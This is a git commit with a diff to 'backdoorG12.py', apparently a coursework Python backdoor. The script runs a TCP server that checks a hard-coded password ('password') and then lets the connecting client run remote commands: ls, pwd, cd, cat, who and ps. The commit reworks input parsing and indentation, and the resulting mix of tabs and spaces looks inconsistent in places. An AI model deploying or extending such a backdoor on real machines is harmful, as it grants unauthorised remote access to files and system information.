ce9d4530eab192494b471f15215b0dbf6546a848
hthkwan <herman_fire@hotmail.com>
2017-01-28 18:52:57 -0700

    changes to input parsing
    Most changes are just tab/spacing changes
    Changed where user input and how, split by default (with no args) splits
    on space and newline, so it is all we need
    
    Known bugs:
    - cd and cat when given no arguments, returns as command not found

--- backdoorG12.py
+++ backdoorG12.py
@@ -3,7 +3,7 @@ import socketserver
 import socket, threading
 import subprocess
 
-password = "password\n"
+password = "password"
 passwordRequest = "Please enter the password or disconnect by inputting \"off\"\n"
 incorrectPw = "Incorrect password you may disconnect by inputting \"off\"\n"
 welcome = "Welcome back!\n"
@@ -26,17 +26,17 @@ def pwd_com():
 
 
 def cd_com(relPath):
-    cwd = os.getcwd()
-    if relPath[0]=='/':
-        path = relPath #arguments is an absolute path
-    else:
-        path = os.path.join(cwd,relPath) #argumment is a relative path
+	cwd = os.getcwd()
+	if relPath[0]=='/':
+		path = relPath #arguments is an absolute path
+	else:
+		path = os.path.join(cwd,relPath) #argumment is a relative path
 
-    try:
-        os.chdir(path)
-        return("dir changed to "+path+"\n")
-    except:
-        return("No such path "+path+"\n")
+	try:
+		os.chdir(path)
+		return("dir changed to "+path+"\n")
+	except:
+		return("No such path "+path+"\n")
 
 def hlp_com():
     return ("pwd - returns current working directory\ncd <dir> - changes current working directory to <dir>\n"
@@ -54,42 +54,42 @@ def ps_com():
 #    return (subprocess.check_output(["/sbin/ifconfig"]).decode("utf-8")) #command must be located in /sbin
 
 def off_com():
-    return ("client disconnect\n")
+	return ("client disconnect\n")
 
 class MyTCPHandler(socketserver.BaseRequestHandler):
-   BUFFER_SIZE = 4096
-   def handle(self):
-       print("hi")
-       authorized = False #authorization flag
-       self.request.sendall(bytearray(passwordRequest, "UTF-8"))
+	BUFFER_SIZE = 4096
+	def handle(self):
+		print("hi")
+		authorized = False #authorization flag
+		self.request.sendall(bytearray(passwordRequest, "UTF-8"))
 
-       while 1:
-           data = self.request.recv(self.BUFFER_SIZE)
-           if len(data) == self.BUFFER_SIZE:
-               while 1:
-                   try:  # error means no more data
-                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
-                   except:
-                       break
+		while 1:
+			data = self.request.recv(self.BUFFER_SIZE)
+			if len(data) == self.BUFFER_SIZE:
+				while 1:
+					try:  # error means no more data
+						data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
+					except:
+						break
 
-           if len(data) == 0:
-               continue
-           data = data.decode( "utf-8")
+			if len(data) == 0:
+				continue
+			data = data.decode( "utf-8")
+			command = data.split() # splits on space and \n changed from previous method because it is inflexible
             #checks to see if the password has already been checked
-           if not authorized:
-               authorized = (data == password)
-               if not authorized:
-                   print(data)
-                   ##disconnect if password is not known
-                   if (data == "off\n"):
-                       break
-                   self.request.sendall(bytearray(incorrectPw, "UTF-8"))
-                   continue
-               else:
-                   self.request.sendall(bytearray(welcome, "UTF-8"))
-                   continue
-
-           #command = data.split()  # splits on space and \n
+			if not authorized:
+				authorized = (data == password)
+				if not authorized:
+					print(data)
+					##disconnect if password is not known
+					if (data == "off"):
+						print('bye')
+						break
+					self.request.sendall(bytearray(incorrectPw, "UTF-8"))
+					continue
+				else:
+					self.request.sendall(bytearray(welcome, "UTF-8"))
+					continue
 
            # if data.startswith('ls'):
            #     response = ls_com()
@@ -110,38 +110,39 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
            # else:
            #     response = "command not found\n"
 
-           dir = ""
-           try:
-              data,dir=data.split(" ")
-              dir=dir.rstrip('\n')
-           except ValueError:
-              print("\n")
+			#dir = ""
+			#try:
+			#	data,dir=data.split(" ")
+			#	dir=dir.rstrip('\n')
+			#except ValueError:
+			#	print("\n")
 
-           option = {'ls\n': ls_com,
-                    'pwd\n': pwd_com,
-                    'help\n': hlp_com,
-                    'who\n':who_com,
-                    'ps\n':ps_com,
-                    'off\n':off_com,
+			option = {'ls': ls_com,
+					'pwd': pwd_com,
+                    'help': hlp_com,
+                    'who':who_com,
+                    'ps':ps_com,
+                    'off':off_com,
                     'cd':cd_com,
                     'cat':cat_com}
 
-           #check the dictionary to see if the commmand exists and call the according function
-           try:
-               if dir:
-                   response = option[data](dir)
-               else:
-                   response = option[data]()
-           except:
-               response = ("Command not Found\n")
+			#check the dictionary to see if the commmand exists and call the according function
+			try:
+					
+				if len(command) > 1: #does not find cat and cd if there is no 2nd arg
+					response = option[command[0]](command[1])
+				else:
+					response = option[command[0]]()
+			except:
+				response = ("Command not Found\n")
 
-           self.request.sendall(bytearray(response,"UTF-8"))
-           print("%s (%s) wrote: %s" % (self.client_address[0],
-                threading.currentThread().getName(), data.strip()))
-           #print(response)
-           if(response=="client disconnect\n"):
-               print("bye")
-               break
+			self.request.sendall(bytearray(response,"UTF-8"))
+			print("%s (%s) wrote: %s" % (self.client_address[0],
+				threading.currentThread().getName(), data.strip()))
+			#print(response)
+			if(response=="client disconnect\n"):
+				print("bye")
+				break
 
 
 if __name__ == "__main__":
